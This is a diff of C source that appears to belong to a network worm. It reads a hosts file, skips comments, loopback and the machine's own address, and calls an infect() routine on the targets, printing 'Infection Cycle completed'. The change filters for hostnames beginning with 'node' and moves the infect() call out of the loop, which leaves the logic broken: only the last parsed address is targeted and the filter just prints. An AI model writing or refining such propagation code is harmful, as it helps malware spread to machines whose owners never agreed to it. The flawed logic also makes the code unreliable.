@@ -170,23 +170,32 @@ int main()
         }
 
         while (fgets(line, 128, fp) != (char *)0) {
-            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || (line[0]!= '1' && line[1] != '2' && line[2] != '7'))
-                continue;
+            char current_hostname[64];
 
-            if (sscanf(line, "%s", ip) != 1)
+            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
                 continue;
+            }
 
-            if (strcmp(ip, "127.0.0.1") == 0)
+            if (sscanf(line, "%s %s", ip, current_hostname) != 2) {
                 continue;
+            }
 
             if (strcmp(ip, my_ip) == 0) {
                 continue;
             }
 
-            infect(ip);
-            printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
-            sleep(10);
+            /* Check if the first 4 characters of the hostname are "node" */
+            if (strncmp(current_hostname, "node", 4) == 0) {
+                
+                /* SUCCESS: 'ip' now holds the address of a node. */
+                 printf("IP for %s found: %s\n", current_hostname, ip);
+            }
         }
+
+        infect(ip);
+        printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
+        sleep(10);
+        
         fclose(fp);
     }
 }
